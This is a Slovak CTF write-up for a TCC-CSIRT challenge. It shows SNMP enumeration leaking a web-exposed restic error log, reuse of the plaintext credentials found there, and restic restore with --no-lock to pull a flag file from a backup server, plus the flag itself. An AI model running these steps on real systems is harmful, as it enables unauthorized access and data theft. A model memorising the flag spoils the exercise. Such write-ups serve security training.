# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> admin Johnson began testing backup procedures on server **`johnson-backup.cypherfix.tcc`**, but left the process incomplete due to other interesting tasks. Your task is to determine whether the current state is exploitable.
> 
> See you in the next incident!
> 
> **Hint1:**
> Admin Johnson is not strong on maintaining password hygiene.

----------

# Riešenie #


Prvé čo som skúsil bolo oskenovať daný server voči otvoreným portom.

    nmap -sV -p- johnson-backup.cypherfix.tcc
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 13:30 EDT
    Nmap scan report for johnson-backup.cypherfix.tcc (10.99.24.30)
    Host is up (0.016s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORTSTATE SERVICE VERSION
    80/tcp  open  httpApache httpd 2.4.61 ((Debian))
    199/tcp open  smuxLinux SNMP multiplexer
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Vidíme otvorené porty 80 a 199. 80 klasika, web server, po otvorení len defaultná apache stránka, skúsil som však fuzzing, ale nič nenašlo

**`(dirb http://johnson-backup.cypherfix.tcc/ -X .txt,.htm,.html,.php  )`**

zaujimavejší je však port 199, čo ako je písané SNMP multiplexer, nejdem vysvetľovať, čo to je, google pomôže.

Skúsil som na kali pár príkazov,
    
    snmpwalk -v1 -c public johnson-backup.cypherfix.tcc
    snmpwalk -v1 -c private johnson-backup.cypherfix.tccs
    nmpwalk -v2c -c public johnson-backup.cypherfix.tcc

Posledný vrátil zaujímavé výsledky

    iso.3.6.1.2.1.25.4.2.1.1.1 = INTEGER: 1
    iso.3.6.1.2.1.25.4.2.1.1.7 = INTEGER: 7
    iso.3.6.1.2.1.25.4.2.1.1.8 = INTEGER: 8
    iso.3.6.1.2.1.25.4.2.1.1.9 = INTEGER: 9
    iso.3.6.1.2.1.25.4.2.1.1.14 = INTEGER: 14
    iso.3.6.1.2.1.25.4.2.1.1.18 = INTEGER: 18
    iso.3.6.1.2.1.25.4.2.1.1.20 = INTEGER: 20
    iso.3.6.1.2.1.25.4.2.1.1.28 = INTEGER: 28
    iso.3.6.1.2.1.25.4.2.1.1.29 = INTEGER: 29
    iso.3.6.1.2.1.25.4.2.1.1.30 = INTEGER: 30
    iso.3.6.1.2.1.25.4.2.1.1.1334 = INTEGER: 1334
    iso.3.6.1.2.1.25.4.2.1.1.2400 = INTEGER: 2400
    iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "supervisord"
    iso.3.6.1.2.1.25.4.2.1.2.7 = STRING: "apache2ctl"
    iso.3.6.1.2.1.25.4.2.1.2.8 = STRING: "cron"
    iso.3.6.1.2.1.25.4.2.1.2.9 = STRING: "snmpd"
    iso.3.6.1.2.1.25.4.2.1.2.14 = STRING: "cron"
    iso.3.6.1.2.1.25.4.2.1.2.18 = STRING: "sh"
    iso.3.6.1.2.1.25.4.2.1.2.20 = STRING: "restic.sh"
    iso.3.6.1.2.1.25.4.2.1.2.28 = STRING: "apache2"
    iso.3.6.1.2.1.25.4.2.1.2.29 = STRING: "apache2"
    iso.3.6.1.2.1.25.4.2.1.2.30 = STRING: "apache2"
    iso.3.6.1.2.1.25.4.2.1.2.1334 = STRING: "apache2"
    iso.3.6.1.2.1.25.4.2.1.2.2400 = STRING: "sleep"
    iso.3.6.1.2.1.25.4.2.1.3.1 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.7 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.8 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.9 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.14 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.18 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.20 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.28 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.29 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.30 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.1334 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.3.2400 = OID: ccitt.0
    iso.3.6.1.2.1.25.4.2.1.4.1 = STRING: "/usr/bin/python3"
    iso.3.6.1.2.1.25.4.2.1.4.7 = STRING: "/bin/sh"
    iso.3.6.1.2.1.25.4.2.1.4.8 = STRING: "/usr/sbin/cron"
    iso.3.6.1.2.1.25.4.2.1.4.9 = STRING: "/usr/sbin/snmpd"
    iso.3.6.1.2.1.25.4.2.1.4.14 = STRING: "/usr/sbin/CRON"
    iso.3.6.1.2.1.25.4.2.1.4.18 = STRING: "/bin/sh"
    iso.3.6.1.2.1.25.4.2.1.4.20 = STRING: "/bin/bash"
    iso.3.6.1.2.1.25.4.2.1.4.28 = STRING: "/usr/sbin/apache2"
    iso.3.6.1.2.1.25.4.2.1.4.29 = STRING: "/usr/sbin/apache2"
    iso.3.6.1.2.1.25.4.2.1.4.30 = STRING: "/usr/sbin/apache2"
    iso.3.6.1.2.1.25.4.2.1.4.1334 = STRING: "/usr/sbin/apache2"
    iso.3.6.1.2.1.25.4.2.1.4.2400 = STRING: "sleep"
    iso.3.6.1.2.1.25.4.2.1.5.1 = STRING: "/usr/bin/supervisord"
    iso.3.6.1.2.1.25.4.2.1.5.7 = STRING: "/usr/sbin/apache2ctl -D FOREGROUND"
    iso.3.6.1.2.1.25.4.2.1.5.8 = STRING: "-f"
    iso.3.6.1.2.1.25.4.2.1.5.9 = STRING: "-f"
    iso.3.6.1.2.1.25.4.2.1.5.14 = STRING: "-f"
    iso.3.6.1.2.1.25.4.2.1.5.18 = STRING: "-c /etc/scripts/restic.sh >> /var/www/html/1790c4c2883ad30be0222a3a93004e66/restic.err.log 2>&1"
    iso.3.6.1.2.1.25.4.2.1.5.20 = STRING: "/etc/scripts/restic.sh"
    iso.3.6.1.2.1.25.4.2.1.5.28 = STRING: "-D FOREGROUND"
    iso.3.6.1.2.1.25.4.2.1.5.29 = STRING: "-D FOREGROUND"
    iso.3.6.1.2.1.25.4.2.1.5.30 = STRING: "-D FOREGROUND"
    iso.3.6.1.2.1.25.4.2.1.5.1334 = STRING: "-D FOREGROUND"
    iso.3.6.1.2.1.25.4.2.1.5.2400 = STRING: "86400"
    iso.3.6.1.2.1.25.4.2.1.6.1 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.7 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.8 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.9 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.14 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.18 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.20 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.28 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.29 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.30 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.1334 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.6.2400 = INTEGER: 4
    iso.3.6.1.2.1.25.4.2.1.7.1 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.7 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.8 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.9 = INTEGER: 1
    iso.3.6.1.2.1.25.4.2.1.7.14 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.18 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.20 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.28 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.29 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.30 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.1334 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.2400 = INTEGER: 2
    iso.3.6.1.2.1.25.4.2.1.7.2400 = No more variables left in this MIB View (It is past the end of the MIB tree)

Z tohto výpisu je vidieť, že jeden skript zapisuje error log na /var/www/html/1790c4c2883ad30be0222a3a93004e66/restic.err.log, na ktorý sa samozrejme vieme pozrieť pomocou otvoreného portu 80, keďže tento priečinok je dotupný z webu. zadáme teda do prehliadača 

	http://johnson-backup.cypherfix.tcc/1790c4c2883ad30be0222a3a93004e66/restic.err.log

Zobrazí sa nam daný log

    restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test check
    using temporary cache in /tmp/restic-check-cache-3629819862
    create exclusive lock for repository
    Save(<lock/66761ff991>) returned error, retrying after 552.330144ms: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 1.080381816s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 1.31013006s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 1.582392691s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 2.340488664s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 4.506218855s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 3.221479586s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 5.608623477s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 7.649837917s: server response unexpected: 500 Internal Server Error (500)
    Save(<lock/66761ff991>) returned error, retrying after 15.394871241s: server response unexpected: 500 Internal Server Error (500)
    server response unexpected: 500 Internal Server Error (500)
    github.com/restic/restic/internal/backend/rest.(*Backend).Save
    	github.com/restic/restic/internal/backend/rest/rest.go:167
    github.com/restic/restic/internal/backend.(*RetryBackend).Save.func1
    	github.com/restic/restic/internal/backend/backend_retry.go:66
    github.com/cenkalti/backoff.RetryNotifyWithTimer
    	github.com/cenkalti/backoff/retry.go:55
    github.com/cenkalti/backoff.RetryNotify
    	github.com/cenkalti/backoff/retry.go:34
    github.com/restic/restic/internal/backend.(*RetryBackend).retry
    	github.com/restic/restic/internal/backend/backend_retry.go:46
    github.com/restic/restic/internal/backend.(*RetryBackend).Save
    	github.com/restic/restic/internal/backend/backend_retry.go:60
    github.com/restic/restic/internal/cache.(*Backend).Save
    	github.com/restic/restic/internal/cache/backend.go:59
    github.com/restic/restic/internal/repository.(*Repository).SaveUnpacked
    	github.com/restic/restic/internal/repository/repository.go:488
    github.com/restic/restic/internal/restic.SaveJSONUnpacked
    	github.com/restic/restic/internal/restic/json.go:31
    github.com/restic/restic/internal/restic.(*Lock).createLock
    	github.com/restic/restic/internal/restic/lock.go:161
    github.com/restic/restic/internal/restic.newLock
    	github.com/restic/restic/internal/restic/lock.go:105
    github.com/restic/restic/internal/restic.NewExclusiveLock
    	github.com/restic/restic/internal/restic/lock.go:73
    main.lockRepository
    	github.com/restic/restic/cmd/restic/lock.go:42
    main.lockRepoExclusive
    	github.com/restic/restic/cmd/restic/lock.go:27
    main.runCheck
    	github.com/restic/restic/cmd/restic/cmd_check.go:212
    main.glob..func5
    	github.com/restic/restic/cmd/restic/cmd_check.go:37
    github.com/spf13/cobra.(*Command).execute
    	github.com/spf13/cobra/command.go:916
    github.com/spf13/cobra.(*Command).ExecuteC
    	github.com/spf13/cobra/command.go:1044
    github.com/spf13/cobra.(*Command).Execute
    	github.com/spf13/cobra/command.go:968
    main.main
    	github.com/restic/restic/cmd/restic/main.go:98
    runtime.main
    	runtime/proc.go:250
    runtime.goexit
    	runtime/asm_amd64.s:1594
    unable to create lock in backend

Keď sa pokúsim zreplikovať príkaz, výsledok dostanem veľmi podobný. Čo je však zaujímavé, je, že tu vidíme heslo v plaintexe a z hintu je známe, že teda admin johnoson nemá správne návyky na heslá, takže bude zrejmé, že jeho heslo nejako budeme vedieť použiť niekde inde.

Skúsil som pozrieť, či mi niečo nevráti curl

    curl restic-server.cypherfix.tcc:8000/test      
	Unauthorized

Skúsim použiť známe údaje

    curl -u johnson:KGDkjgsdsdg883hhd restic-server.cypherfix.tcc:8000/test
    Not Found

Tu už vrátilo 200/OK aj z odpoveďou Not Fount, skúsim nejakú enumeráciu

    curl -u johnson:KGDkjgsdsdg883hhd http://restic-server.cypherfix.tcc:8000/test/config vrátilo haky baky, zrejme nejakú binárku, tak ju radšej stiahneme

	curl -u johnson:KGDkjgsdsdg883hhd http://restic-server.cypherfix.tcc:8000/test/config -o restic-config.bin

Máme teda resting config binárku.
    
Skúsime pozrieť základne veci

    strings restic-config.bin
    file restic-config.bin
	binwalk restic-config.bin
	restic cat config -r restic-config.bin

Nič zaujímave nevrátilo, možno je to zašifrované

    openssl enc -aes-256-cbc -d -in restic-config.bin -out decrypted.bin
    enter AES-256-CBC decryption password:
    bad magic number

Opäť nič zaujímave. Buď treba zmeniť prístup alebo sa na to pozrieť inak a pozornejšie. Po troche googlenia a porozprávaní sa z neurónkami som zistil, že môžem skúsiť pridat do príkazu resting atribút --no-lock

    restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test snapshots
    
    enter password for repository: 
    repository 902ea39d opened (version 2, compression level auto)
    Save(<lock/ffab89f3cb>) returned error, retrying after 501.938496ms: unexpected HTTP response (500): 500 Internal Server Error
    Save(<lock/ffab89f3cb>) returned error, retrying after 2.108163714s: unexpected HTTP response (500): 500 Internal Server Error
      signal interrupt received, cleaning up
    unable to create lock in backend: context canceled
     
    ┌──(kali㉿kali)-[~]
    └─$ restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test snapshots --no-lock
    enter password for repository: 
    repository 902ea39d opened (version 2, compression level auto)
    IDTime Host  TagsPaths
    --------------------------------------------------------------------
    8dfb6a02  2024-10-14 16:56:18  fcf671955256  /etc/secret
    --------------------------------------------------------------------
    1 snapshots

OK, tu už nám vrátilo niečo vskutku zaujímavé. Skúsime ďalší príkaz.

    restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test ls 8dfb6a02 --no-lock
	enter password for repository: 
	repository 902ea39d opened (version 2, compression level auto)
	[0:00] 100.00%  1 / 1 index files loaded
	snapshot 8dfb6a02 of [/etc/secret] at 2024-10-14 20:56:18.631782921 +0000 UTC by root@fcf671955256 filtered by []:
	/etc
	/etc/secret
	/etc/secret/flag


Nooo, tu už je to zaujímave.. Trochu ďalšieho researchu a zistil som okrem ls môžem použiť aj restore a obnoviť k sebe

    restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test restore 8dfb6a02 --target /home/kali/restic_johnson --no-lock
    enter password for repository: 
    repository 902ea39d opened (version 2, compression level auto)
    [0:00] 100.00%  1 / 1 index files loaded
    restoring snapshot 8dfb6a02 of [/etc/secret] at 2024-10-14 20:56:18.631782921 +0000 UTC by root@fcf671955256 to /home/kali/restic_johnson
    Summary: Restored 3 files/dirs (26 B) in 0:00

Bingo... Podme otvoriť súbor s vlajkou!

    $ cat restic_johnson/etc/secret/flag 
    FLAG{OItn-zKZW-cht7-RNH4}
    

----------

## Vlajka ##
    FLAG{OItn-zKZW-cht7-RNH4}